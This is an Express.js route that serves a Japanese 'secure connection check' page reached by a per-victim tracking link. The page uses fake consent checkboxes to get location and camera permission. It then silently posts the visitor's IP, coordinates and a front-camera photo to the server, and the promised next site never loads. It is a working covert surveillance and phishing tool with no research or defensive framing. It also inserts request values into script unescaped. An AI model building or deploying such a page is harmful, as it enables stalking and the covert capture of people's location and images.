app.get('/t/:id', (req, res) => {
  const id = req.params.id;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
  const time = new Date().toLocaleString('ja-JP');

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>安全確認</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#ffffff; height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Segoe UI','Hiragino Sans',sans-serif; }
    .container { max-width:460px; width:90%; padding:32px 28px; background:#f8f9fa; border:1px solid #e0e0e0; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.06); text-align:center; }
    .icon { font-size:48px; margin-bottom:12px; }
    h1 { font-size:22px; color:#1a1a1a; font-weight:600; letter-spacing:-0.5px; }
    p { color:#555; font-size:15px; margin:12px 0 20px 0; line-height:1.6; }
    .terms-box { background:#fff; border:1px solid #e8e8e8; border-radius:8px; padding:16px 18px; text-align:left; margin-bottom:16px; }
    .terms-box label { display:flex; align-items:center; gap:12px; font-size:14px; color:#333; cursor:pointer; padding:6px 0; }
    .terms-box input[type="checkbox"] { width:18px; height:18px; accent-color:#2b6cb0; flex-shrink:0; cursor:pointer; }
    .terms-box .status { font-size:12px; color:#888; margin-left:auto; }
    .terms-box .status.ok { color:#2b6cb0; font-weight:600; }
    .terms-box .status.ng { color:#b22222; }
    .btn-next { width:100%; padding:12px; background:#e0e0e0; color:#999; border:none; border-radius:6px; font-size:16px; font-weight:600; cursor:not-allowed; transition:all 0.2s; pointer-events:none; }
    .btn-next.active { background:#2b6cb0; color:#fff; cursor:pointer; pointer-events:auto; }
    .btn-next.active:hover { background:#1a4f8a; }
    .foot { font-size:12px; color:#aaa; margin-top:14px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">🛡️</div>
    <h1>安全な接続を確認</h1>
    <p>次のページへ進むには、以下の項目に同意してください。<br><span style="font-size:13px;color:#888;">両方のチェックが必須です</span></p>
    <div class="terms-box">
      <label>
        <input type="checkbox" id="chk-location">
        <span>位置情報の利用を許可する</span>
        <span class="status" id="status-location">⏳ 未確認</span>
      </label>
      <label>
        <input type="checkbox" id="chk-camera">
        <span>カメラの利用を許可する</span>
        <span class="status" id="status-camera">⏳ 未確認</span>
      </label>
    </div>
    <button class="btn-next" id="btn-next">次のサイトを見る</button>
    <div class="foot">© 2026 Secure Connection</div>
  </div>

  <script>
    const id = '${id}';
    const ip = '${ip}';
    const time = '${time}';

    const chkLocation = document.getElementById('chk-location');
    const chkCamera = document.getElementById('chk-camera');
    const statusLoc = document.getElementById('status-location');
    const statusCam = document.getElementById('status-camera');
    const btnNext = document.getElementById('btn-next');

    var locationOk = false;
    var cameraOk = false;
    var locationSent = false;
    var photoSent = false;
    var locationChecked = false;
    var cameraChecked = false;

    function checkLocation() {
      if (locationChecked) return;
      locationChecked = true;
      if (!navigator.geolocation) {
        statusLoc.textContent = '❌ 非対応';
        statusLoc.className = 'status ng';
        chkLocation.checked = false;
        locationOk = false;
        updateButton();
        return;
      }
      statusLoc.textContent = '⏳ 確認中...';
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          locationOk = true;
          chkLocation.checked = true;
          statusLoc.textContent = '✅ 許可済み';
          statusLoc.className = 'status ok';
          if (!locationSent) {
            locationSent = true;
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: id, ip: ip, time: time, lat: pos.coords.latitude, lon: pos.coords.longitude })
            });
          }
          updateButton();
        },
        function() {
          locationOk = false;
          chkLocation.checked = false;
          statusLoc.textContent = '❌ 拒否されました';
          statusLoc.className = 'status ng';
          if (!locationSent) {
            locationSent = true;
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: id, ip: ip, time: time, lat: null, lon: null })
            });
          }
          updateButton();
        }
      );
    }

    function checkCamera() {
      if (cameraChecked) return;
      cameraChecked = true;
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusCam.textContent = '❌ 非対応';
        statusCam.className = 'status ng';
        chkCamera.checked = false;
        cameraOk = false;
        updateButton();
        return;
      }
      statusCam.textContent = '⏳ 確認中...';
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(function(stream) {
          cameraOk = true;
          chkCamera.checked = true;
          statusCam.textContent = '✅ 許可済み';
          statusCam.className = 'status ok';
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = function() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
            if (!photoSent) {
              photoSent = true;
              fetch('/photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id, image: dataUrl })
              });
            }
            stream.getTracks().forEach(function(track) { track.stop(); });
          };
          updateButton();
        })
        .catch(function() {
          cameraOk = false;
          chkCamera.checked = false;
          statusCam.textContent = '❌ 拒否されました';
          statusCam.className = 'status ng';
          updateButton();
        });
    }

    function updateButton() {
      if (locationOk && cameraOk) {
        btnNext.classList.add('active');
        btnNext.textContent = '✅ 次のサイトを見る';
        btnNext.disabled = false;
      } else {
        btnNext.classList.remove('active');
        btnNext.textContent = '⚠️ 両方の許可が必要です';
        btnNext.disabled = true;
      }
    }

    chkLocation.addEventListener('click', function(e) {
      if (!chkLocation.checked) {
        e.preventDefault();
        alert('位置情報の許可が必要です。「許可」を押してください。');
        return;
      }
      checkLocation();
    });

    chkCamera.addEventListener('click', function(e) {
      if (!chkCamera.checked) {
        e.preventDefault();
        alert('カメラの許可が必要です。「許可」を押してください。');
        return;
      }
      checkCamera();
    });

    btnNext.addEventListener('click', function() {
      if (locationOk && cameraOk) {
        document.body.innerHTML = '<div style="color:#888;font-size:14px;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">✅ 認証完了</div>';
      }
    });
  </script>
</body>
</html>
  `);
});
